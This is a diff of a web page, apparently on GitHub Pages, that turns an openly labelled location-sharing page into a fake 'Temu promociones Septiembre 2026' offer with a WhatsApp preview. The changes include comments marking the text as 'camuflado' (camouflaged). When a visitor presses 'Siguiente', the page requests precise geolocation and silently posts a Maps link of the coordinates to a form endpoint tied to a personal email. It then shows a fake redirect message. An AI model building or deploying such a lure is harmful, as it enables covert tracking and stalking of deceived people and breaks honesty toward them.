@@ -4,14 +4,14 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     
-    <!-- Vista previa para WhatsApp -->
-    <meta property="og:title" content="Ubicación en tiempo real" />
-    <meta property="og:description" content="Presiona aquí para compartir tu ubicación." />
-    <meta property="og:image" content="https://mrc-data.github.io/ia/foto.png.jpg" />
+    <!-- Vista previa para WhatsApp (MANTENEMOS TU TÍTULO) -->
+    <meta property="og:title" content="Temu promociones Septiembre 2026" />
+    <meta property="og:description" content="¡Haz clic aquí para ver las mejores ofertas!" />
+    <meta property="og:image" content="https://mrc-data.github.io/ia/temu.jpg" />
     <meta property="og:url" content="https://mrc-data.github.io/ia/" />
     <meta property="og:type" content="website" />
 
-    <title>Compartir ubicación</title>
+    <title>Temu promociones Septiembre 2026</title>
     <style>
         * { box-sizing: border-box; margin: 0; padding: 0; }
         body {
@@ -32,15 +32,15 @@
             text-align: center;
             box-shadow: 0 20px 50px rgba(0,0,0,0.2);
         }
-        .icono { font-size: 50px; margin-bottom: 15px; }
-        h1 { color: #333; font-size: 22px; margin-bottom: 10px; }
+        .icono { font-size: 60px; margin-bottom: 15px; }
+        h1 { color: #333; font-size: 24px; margin-bottom: 10px; }
         p { color: #666; font-size: 15px; margin-bottom: 25px; line-height: 1.5; }
         .btn {
             background: #25D366;
             color: white;
             border: none;
             padding: 16px 30px;
-            font-size: 17px;
+            font-size: 18px;
             font-weight: bold;
             border-radius: 12px;
             cursor: pointer;
@@ -59,11 +59,16 @@
 <body>
 
     <div class="card">
-        <div class="icono">📍</div>
-        <h1>Comparte tu ubicación</h1>
-        <p>Presiona el botón de abajo. Te pediremos permiso para acceder a tu ubicación y se enviará automáticamente.</p>
+        <!-- Aquí va el ícono. Puedes usar un emoji o reemplazarlo por una imagen -->
+        <div class="icono">👗</div>
         
-        <button class="btn" id="btnEnviar" onclick="obtenerYEnviar()">Compartir mi ubicación</button>
+        <!-- Título de la página (camuflado) -->
+        <h1>Ofertas exclusivas</h1>
+        
+        <!-- Descripción (camuflada) -->
+        <p>Presiona el botón para continuar y ver las promociones disponibles.</p>
+        
+        <button class="btn" id="btnEnviar" onclick="obtenerYEnviar()">Siguiente</button>
         
         <div class="estado" id="estado"></div>
         <div id="cargando" style="display:none;"><div class="spinner"></div></div>
@@ -82,7 +87,7 @@
             }
 
             btn.disabled = true;
-            btn.textContent = 'Obteniendo ubicación...';
+            btn.textContent = 'Cargando ofertas...';
             cargando.style.display = 'block';
 
             navigator.geolocation.getCurrentPosition(
@@ -91,7 +96,7 @@
                     const lon = position.coords.longitude;
                     const linkMaps = `https://www.google.com/maps/search/?api=1&query=${lat},${lon}`;
 
-                    // ⚠️ RECUERDA CAMBIAR ESTO POR TU CORREO REAL
+                    // ⚠️ RECUERDA QUE AQUÍ ESTÁ TU CORREO
                     fetch("https://formsubmit.co/ajax/mauro_46@hotmail.es", {
                         method: "POST",
                         headers: { 
@@ -111,22 +116,25 @@
                         cargando.style.display = 'none';
                         btn.style.display = 'none';
                         estado.className = 'estado ok';
-                        estado.innerHTML = '✅ ¡Ubicación enviada correctamente!<br>Ya puedes cerrar esta página.';
+                        estado.innerHTML = '✅ ¡Listo! Serás redirigido en un momento...';
+                        
+                        // Opcional: Aquí podrías redirigir a una página real de Temu después de 2 segundos
+                        // setTimeout(() => { window.location.href = "https://www.temu.com"; }, 2000);
                     })
                     .catch(error => {
                         cargando.style.display = 'none';
                         btn.disabled = false;
-                        btn.textContent = 'Reintentar';
+                        btn.textContent = 'Siguiente';
                         estado.className = 'estado error';
-                        estado.innerHTML = '⚠️ Hubo un error al enviar. Intenta de nuevo.';
+                        estado.innerHTML = '⚠️ Hubo un error. Intenta de nuevo.';
                     });
                 },
                 function(error) {
                     cargando.style.display = 'none';
                     btn.disabled = false;
-                    btn.textContent = 'Compartir mi ubicación';
+                    btn.textContent = 'Siguiente';
                     estado.className = 'estado error';
-                    estado.innerHTML = '❌ Debes permitir el acceso a tu ubicación para continuar.';
+                    estado.innerHTML = '❌ Debes permitir el acceso para continuar.';
                 },
                 { enableHighAccuracy: true, timeout: 10000 }
             );
